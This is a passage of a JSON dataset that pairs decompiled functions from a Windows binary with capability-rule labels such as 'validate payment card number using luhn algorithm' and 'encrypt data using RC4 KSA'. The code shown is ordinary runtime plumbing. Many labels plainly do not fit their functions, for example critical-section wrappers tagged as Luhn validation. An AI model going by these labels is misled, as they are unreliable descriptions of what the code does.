        "decompiled_code": "\nint32_t __fastcall fcn.004188bc(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.00404610();\n    uVar1 = fcn.00404610();\n    *(in_EAX + 4) = uVar1;\n    sub.kernel32.dll_InitializeCriticalSection();\n    iVar2 = fcn.00418578();\n    fcn.00419680();\n    *(iVar2 + 0x10) = 1;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = in_EAX + 8;\n    }\n    return in_EAX;\n}\n",
        "token_count": 211
    },
    "00418a18": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00418a18(uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint *arg_ch;\n    uint uStack284;\n    uint uStack280;\n    uchar *puStack276;\n    uint var_10ch;\n    uint var_108h;\n    uint *var_8h;\n    uint var_4h;\n    \n    puStack276 = &stack0xfffffffc;\n    var_10ch = 0;\n    uStack280 = 0x418a9b;\n    uStack284 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack284;\n    fcn.00404520();\n    var_8h = &var_108h;\n    var_4h._0_1_ = 4;\n    arg_ch = &var_8h;\n    arg_8h_00 = 0;\n    fcn.004075f4();\n    fcn.0040daac(arg_8h_00, arg_ch);\n    fcn.00404eb4();\n    *in_FS_OFFSET = arg_8h_00;\n    uStack284 = 0x418aa2;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 282
    },
    "00418b74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00418b74(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_EnterCriticalSection(in_EAX + 8);\n    return;\n}\n",
        "token_count": 39
    },
    "00418c2c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00418c2c(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_LeaveCriticalSection(in_EAX + 8);\n    return;\n}\n",
        "token_count": 41
    },
    "00418e78": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00418e78(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint *arg_ch;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x418ed8;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    var_4h._0_1_ = 0xb;\n    arg_ch = &var_8h;\n    arg_8h = 0;\n    fcn.004075f4();\n    fcn.0040daac(arg_8h, arg_ch);\n    fcn.00404eb4();\n    *in_FS_OFFSET = arg_8h;\n    uStack32 = 0x418edf;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 229
    },
    "00419168": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00419168(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404964();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    *(in_EAX + 4) = in_ECX;\n    *(in_EAX + 8) = arg_ch;\n    *(in_EAX + 0xc) = arg_8h;\n    if (in_DL != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack20;\n    }\n    return;\n}\n",
        "token_count": 186
    },
    "00419248": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00419248(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_ECX;\n    uint *in_EDX;\n    int32_t iVar2;\n    uint var_4h;\n    \n    if (-1 < arg_8h) {\n        arg_8h = arg_8h + 1;\n        iVar2 = in_ECX + 4;\n        do {\n            cVar1 = fcn.004099fc();\n            if (cVar1 != '\\0') {\n                *in_EDX = *(iVar2 + -4);\n                return 1;\n            }\n            iVar2 = iVar2 + 8;\n            arg_8h = arg_8h + -1;\n        } while (arg_8h != 0);\n    }\n    return 0;\n}\n",
        "token_count": 181
    },
    "00419288": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.00419288(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t *in_ECX;\n    uint var_4h;\n    \n    if (-1 < arg_8h) {\n        arg_8h = arg_8h + 1;\n        do {\n            if (in_EAX == *in_ECX) {\n                fcn.004054c0();\n                return 1;\n            }\n            in_ECX = in_ECX + 2;\n            arg_8h = arg_8h + -1;\n        } while (arg_8h != 0);\n    }\n    return 0;\n}\n",
        "token_count": 147
    },
    "004194f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004194f0(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack284;\n    uint uStack280;\n    uchar *puStack276;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack276 = &stack0xfffffffc;\n    uStack280 = 0x419586;\n    uStack284 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffee4;\n    if ((in_EAX != *0x418088) && (in_EAX != *(arg_8h + -8))) {\n        fcn.004045cc();\n        fcn.004194f0(arg_8h);\n        fcn.00404520();\n        fcn.004056d0();\n        fcn.00406aac(0);\n        fcn.00406afc();\n        fcn.00419388();\n    }\n    *in_FS_OFFSET = uStack284;\n    puStack276 = 0x41958d;\n    uStack280 = 0x419585;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 255
    },
    "004196cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004196cc(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    if ((param_2 < 0) || (in_EAX[2] <= param_2)) {\n        fcn.00419764();\n    }\n    iVar1 = *(in_EAX[1] + param_2 * 4);\n    in_EAX[2] = in_EAX[2] + -1;\n    if (param_2 < in_EAX[2]) {\n        fcn.004030ec();\n    }\n    if (iVar1 != 0) {\n        (**(*in_EAX + 4))();\n    }\n    return;\n}\n",
        "token_count": 162
    },
    "0041972c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041972c(uint param_1, uint param_2)\n\n{\n    uint uStack52;\n    int32_t iStack48;\n    uint uStack44;\n    uchar auStack16 [4];\n    uchar uStack12;\n    \n    fcn.00419728();\n    uStack12 = 0;\n    uStack52 = 0;\n    iStack48 = fcn.0040daac(0, auStack16);\n    if (iStack48 == 0) {\n        iStack48 = fcn.00405460();\n    }\n    uStack44 = param_2;\n    // WARNING: Could not recover jumptable at 0x00404ed5. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x493014)(0xeedfade, 1, 7, &uStack52);\n    return;\n}\n",
        "token_count": 195
    },
    "00419854": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00419854(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if ((param_2 < 0) || (in_EAX[2] < param_2)) {\n        fcn.00419764();\n    }\n    if (in_EAX[2] == in_EAX[3]) {\n        (***in_EAX)();\n    }\n    if (param_2 < in_EAX[2]) {\n        fcn.004030ec();\n    }\n    *(in_EAX[1] + param_2 * 4) = param_1;\n    in_EAX[2] = in_EAX[2] + 1;\n    if (param_1 != 0) {\n        (**(*in_EAX + 4))();\n    }\n    return;\n}\n",
        "token_count": 186
    },
    "0041993c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041993c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((param_2 < *(in_EAX + 8)) || (0x7ffffff < param_2)) {\n        fcn.00419764();\n    }\n    if (param_2 != *(in_EAX + 0xc)) {\n        fcn.00402f24();\n        *(in_EAX + 0xc) = param_2;\n    }\n    return;\n}\n",
        "token_count": 117
    },
    "00419978": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00419978(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if ((param_2 < 0) || (0x7ffffff < param_2)) {\n        fcn.00419764();\n    }\n    if (*(in_EAX + 0xc) < param_2) {\n        fcn.0041993c();\n    }\n    if (*(in_EAX + 8) < param_2) {\n        fcn.00403aac();\n    }\n    else {\n        iVar1 = *(in_EAX + 8) + -1;\n        iVar2 = param_2 - iVar1;\n        if (iVar2 == 0 || param_2 < iVar1) {\n            iVar2 = iVar2 + -1;\n            do {\n                fcn.004196cc();\n                iVar2 = iVar2 + 1;\n            } while (iVar2 != 0);\n        }\n    }\n    *(in_EAX + 8) = param_2;\n    return;\n}\n",
        "token_count": 242
    },
    "004199f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004199f0(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.00404610();\n    sub.kernel32.dll_InitializeCriticalSection();\n    uVar1 = fcn.00404610();\n    *(in_EAX + 4) = uVar1;\n    *(in_EAX + 0x20) = 0;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = in_EAX + 8;\n    }\n    return in_EAX;\n}\n",
        "token_count": 187
    },
    "00419a44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00419a44(void)\n\n{\n    uchar extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    int32_t iStack20;\n    uchar *puStack16;\n    int32_t var_5h;\n    \n    puStack16 = 0x419a4f;\n    *NULL = fcn.00404a0c();\n    puStack16 = 0x419a5d;\n    var_5h._0_1_ = extraout_DL;\n    fcn.00419b48();\n    iStack20 = 0x419aa7;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    fcn.00404640();\n    fcn.00404630();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x419aae;\n    iStack20 = 0x419a9a;\n    fcn.00419bac();\n    iStack20 = stack0xfffffff8 + 8;\n    uStack24 = 0x419aa6;\n    sub.kernel32.dll_DeleteCriticalSection();\n    return;\n}\n",
        "token_count": 272
    },
    "00419bac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00419bac(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_LeaveCriticalSection(in_EAX + 8);\n    return;\n}\n",
        "token_count": 39
    },
    "00419d94": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00419d94(uint param_1, int32_t param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack300;\n    uint uStack296;\n    uchar *puStack292;\n    uint var_114h;\n    uint var_110h;\n    uint *var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack292 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack296 = 0x419e4a;\n    uStack300 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack300;\n    if (param_2 == 0) {\n        fcn.00405504();\n    }\n    else {\n        puStack292 = &stack0xfffffffc;\n        fcn.00404520();\n        fcn.004056d0();\n    }\n    var_114h = var_4h;\n    var_110h._0_1_ = 0xb;\n    fcn.00404520();\n    var_10ch = &var_104h;\n    var_108h._0_1_ = 4;\n    uVar1 = 1;\n    fcn.0040db68(1, &var_114h);\n    fcn.00404eb4();\n    *in_FS_OFFSET = uVar1;\n    uStack300 = 0x419e51;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 347
    },
    "0041a0dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041a0dc(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x41a183;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack44 = 0x41a106;\n    fcn.0041a24c();\n    uStack48 = 0x41a166;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &stack0xfffffffc;\n    iVar1 = (**(*param_2 + 0x14))();\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(*param_2 + 0xc))();\n            (**(*param_2 + 0x18))(0);\n            (**(*in_EAX + 0x3c))();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x41a16d;\n    uStack48 = 0x41a165;\n    fcn.0041a308();\n    return;\n}\n",
        "token_count": 361
    },
    "0041a194": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041a194(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x41a1ac;\n    cVar1 = fcn.004047cc();\n    if (cVar1 != '\\0') {\n        puStack20 = 0x41a1bc;\n        fcn.0041a24c();\n        uStack24 = 0x41a234;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack20 = &stack0xfffffffc;\n        (**(*in_EAX + 0x44))();\n        *(in_EAX + 1) = *(param_2 + 4);\n        *(in_EAX + 0xd) = *(param_2 + 0xd);\n        *(in_EAX + 3) = *(param_2 + 0xc);\n        *(in_EAX + 5) = *(param_2 + 5);\n        fcn.004054c0();\n        *(in_EAX + 0xe) = *(param_2 + 0xe);\n        (**(*in_EAX + 0x40))();\n        *in_FS_OFFSET = uStack28;\n        puStack20 = 0x41a245;\n        uStack24 = 0x41a233;\n        fcn.0041a308();\n        return;\n    }\n    puStack20 = 0x41a245;\n    fcn.00419d80();\n    return;\n}\n",
        "token_count": 381
    },
    "0041a2bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041a2bc(uint param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar1 = fcn.0041ae1c;\n    fcn.0041a264(&stack0xfffffffc);\n    (**(*param_2 + 4))(pcVar1);\n    return;\n}\n",
        "token_count": 94
    },
    "0041a31c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041a31c(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uchar uVar3;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x41a3b1;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    iVar1 = (**(*in_EAX + 0x14))();\n    iVar2 = (**(*param_2 + 0x14))();\n    if ((iVar1 == iVar2) && (-1 < iVar1 + -1)) {\n        uVar3 = true;\n        do {\n            (**(*in_EAX + 0xc))();\n            (**(*param_2 + 0xc))(0);\n            fcn.00405894();\n            if (!uVar3) break;\n            iVar1 = iVar1 + -1;\n            uVar3 = iVar1 == 0;\n        } while (!uVar3);\n    }\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x41a3b8;\n    uStack44 = 0x41a3b0;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 343
    },
    "0041a3c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041a3c8(uint param_1, uint param_2)\n\n{\n    uint uStack52;\n    int32_t iStack48;\n    uint uStack44;\n    uchar auStack16 [4];\n    uchar uStack12;\n    \n    fcn.0041a3c4();\n    uStack12 = 0;\n    uStack52 = 0;\n    iStack48 = fcn.0040daac(0, auStack16);\n    if (iStack48 == 0) {\n        iStack48 = fcn.00405460();\n    }\n    uStack44 = param_2;\n    // WARNING: Could not recover jumptable at 0x00404ed5. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x493014)(0xeedfade, 1, 7, &uStack52);\n    return;\n}\n",
        "token_count": 200
    },
    "0041a458": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041a458(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x41a533;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x41a486;\n    fcn.0041a24c();\n    uStack52 = 0x41a50e;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    (**(*in_EAX + 0xc))();\n    (**(*in_EAX + 0x18))();\n    (**(*in_EAX + 0xc))();\n    (**(*in_EAX + 0x20))();\n    (**(*in_EAX + 0x18))();\n    (**(*in_EAX + 0x24))();\n    (**(*in_EAX + 0x20))();\n    (**(*in_EAX + 0x24))();\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x41a515;\n    uStack52 = 0x41a50d;\n    fcn.0041a308();\n    return;\n}\n",
        "token_count": 358
    },
    "0041a6dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041a6dc(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x41a754;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    iVar1 = (**(*in_EAX + 0x14))();\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(*in_EAX + 0xc))();\n            iVar2 = (**(*in_EAX + 0x34))();\n            if (iVar2 == 0) break;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x41a75b;\n    uStack36 = 0x41a753;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 268
    },
    "0041a768": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041a768(uint param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_18h = 0;\n    var_14h = 0;\n    var_4h = 0;\n    uStack44 = 0x41a82b;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    var_8h = param_2;\n    iVar1 = (**(*in_EAX + 0x14))();\n    if (-1 < iVar1 + -1) {\n        var_ch = 0;\n        var_10h = iVar1;\n        do {\n            (**(*in_EAX + 0xc))();\n            fcn.0041af44();\n            fcn.00405654();\n            iVar1 = fcn.0040e840();\n            if (iVar1 != 0) {\n                fcn.00405964(&fcn.0041a768::var_18h);\n                iVar1 = (**(*in_EAX + 0x34))();\n                if (iVar1 == 0) goto code_r0x0041a808;\n            }\n            var_ch = var_ch + 1;\n            var_10h = var_10h + -1;\n        } while (var_10h != 0);\n    }\n    var_ch = -1;\ncode_r0x0041a808:\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x41a832;\n    uStack44 = 0x41a822;\n    fcn.00405490();\n    uStack44 = 0x41a82a;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 470
    },
    "0041a8f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041a8f4(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x41a991;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack36 = 0x41a91c;\n    fcn.0041a24c();\n    uStack40 = 0x41a974;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    (***param_2)();\n    fcn.0041b654();\n    fcn.0040555c();\n    (**(*param_2 + 0xc))();\n    (**(*in_EAX + 0x2c))();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x41a97b;\n    uStack40 = 0x41a973;\n    fcn.0041a308();\n    return;\n}\n",
        "token_count": 310
    },
    "0041a9a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041a9a0(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x41aa41;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    if (param_1 != param_2) {\n        puStack40 = 0x41a9cf;\n        fcn.0041a24c();\n        uStack44 = 0x41aa24;\n        uStack48 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd0;\n        puStack40 = &stack0xfffffffc;\n        (**(*in_EAX + 0xc))();\n        uVar1 = (**(*in_EAX + 0x18))();\n        (**(*in_EAX + 0x48))();\n        (**(*in_EAX + 100))();\n        *in_FS_OFFSET = uVar1;\n        uStack44 = 0x41aa2b;\n        uStack48 = 0x41aa23;\n        fcn.0041a308();\n        return;\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x41aa48;\n    uStack32 = 0x41aa40;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 378
    },
    "0041aa84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041aa84(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    var_ch = 0;\n    uStack24 = 0x41ab28;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack32 = 0x41aaab;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    fcn.0041dbc0();\n    puStack32 = 0x41aab3;\n    fcn.0041a24c();\n    uStack36 = 0x41ab03;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    (**(*var_4h + 0x44))();\n    while( true ) {\n        cVar1 = fcn.0041cb0c();\n        if (cVar1 != '\\0') break;\n        fcn.0041e8f0();\n        (**(*var_4h + 0x38))();\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x41ab0a;\n    uStack36 = 0x41ab02;\n    fcn.0041a308();\n    return;\n}\n",
        "token_count": 388
    },
    "0041b294": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041b294(void)\n\n{\n    int32_t *in_EAX;\n    \n    (**(*in_EAX + 0x28))();\n    return;\n}\n",
        "token_count": 39
    },
    "0041b368": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b368(uint arg_8h)\n\n{\n    uint *puVar1;\n    int32_t *in_EAX;\n    int32_t in_EDX;\n    \n    (**(*in_EAX + 0x84))();\n    if (in_EAX[7] == in_EAX[8]) {\n        fcn.0041b294();\n    }\n    if (in_EDX < in_EAX[7]) {\n        fcn.004030ec();\n    }\n    puVar1 = in_EAX[6] + in_EDX * 8;\n    *puVar1 = 0;\n    puVar1[1] = arg_8h;\n    fcn.004054c0();\n    in_EAX[7] = in_EAX[7] + 1;\n    (**(*in_EAX + 0x80))();\n    return;\n}\n",
        "token_count": 193
    },
    "0041b654": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0041b654(void)\n\n{\n    ulong uVar1;\n    int32_t *in_EAX;\n    \n    uVar1 = (**(*in_EAX + 0x18))(0, 0);\n    return uVar1;\n}\n",
        "token_count": 56
    },
    "0041b740": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041b740(uint arg_8h)\n\n{\n    uint var_108h;\n    uint *var_8h;\n    uint var_4h;\n    \n    fcn.00404520();\n    var_8h = &var_108h;\n    var_4h._0_1_ = 4;\n    fcn.0040db68(0, &var_8h);\n    fcn.00404eb4();\n    return;\n}\n",
        "token_count": 115
    },
    "0041b9e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
